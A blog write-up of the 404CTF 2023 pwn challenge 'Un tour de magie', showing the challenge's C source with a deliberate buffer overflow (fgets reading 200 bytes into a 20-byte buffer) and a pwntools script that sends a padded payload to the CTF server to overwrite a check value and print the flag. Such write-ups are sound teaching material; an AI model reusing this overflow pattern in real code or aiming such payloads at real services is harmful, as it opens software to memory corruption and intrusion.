---
title: CTFs | 404CTF2023 | Pwn | Un tour de magie
author: Stillwolfing
date: 2023-06-14
categories: ['CTFs', '404CTF2023', 'Pwn']
tags: ['CTFs', '404CTF2023', 'Pwn']
permalink: /CTFs/404CTF2023/pwn/un_tour_de_magie
---

## Context

![context](/assets/img/CTFs/404CTF2023/pwn/un_tour_de_magie/context.png)

We are given the file tour-de-magie.zip

Inside it, there is the main.wasm file which is a WebAssembly file.

A WebAssembly (Wasm) file is a binary format designed for efficient and safe execution in web browsers. It allows developers to run code written in languages like C, C++, Rust, and others on the web. Wasm files are compact and can be loaded and executed quickly, making them suitable for web applications that require high performance.

We can execute it using the command: ```wasmtime main.wasm```

We are given the code main.c which is the code of the wasm file:

```c
#include<stdlib.h>
#include<stdio.h>

int main() {
    int* check = malloc(sizeof(int));
    *check = 0xcb0fcb0f;
    puts("Alors, t'es un magicien ?");
    char input[20];
    fgets(input, 200, stdin);
    
	if(*check == 0xcb0fcb0f) {
		puts("Apparemment non...");
		exit(0);
	}
    if(*check != 0xcb0fcb0f && *check != 0x50bada55) {
		puts("Pas mal, mais il en faut plus pour m'impressionner !");
		exit(0);
	}
	if(*check == 0x50bada55) {
		puts("Wow ! Respect ! Quelles paroles enchantantes ! Voilà ta récompense...");
		FILE* f = fopen("flag.txt", "r");
		if(f == NULL) {
			puts("Erreur lors de l'ouverture du flag, contactez un administrateur !");
			exit(1);
		}
		char c;
		while((c = fgetc(f)) != -1) {
			putchar(c);
		}
		fclose(f);
	}
}
```

It looks like we have to do a buffer overflow to override the value of the check variable. The input buffer is 20 bytes and the fgets take 200 bytes.

We have to change its value to 0x50bada55.

Let's try to enter characters until we modify the value of check.

![overflow](/assets/img/CTFs/404CTF2023/pwn/un_tour_de_magie/overflow.png)

We are printed some of our 'A's (41). Let's modify the last four characters:

![Bs](/assets/img/CTFs/404CTF2023/pwn/un_tour_de_magie/Bs.png)

It looks like the 17th to 20th character are the check value.

Payload: payload = b'A' * 16 + b'\x55\xda\xba\x50' + b'AAA'

Here is my implementation:

```python
import pwn

conn = pwn.remote('challenges.404ctf.fr', 30274)

rep = conn.recvuntil(b'magicien ?\n')
print(rep)

payload = b'A'*16+ b'\x55\xda\xba\x50' + b'A'*3
print(payload)

conn.sendline(payload)
print(conn.recvline())
print(conn.recvline())
```

We get the flag 🎉 ! I hope you like this pwn.
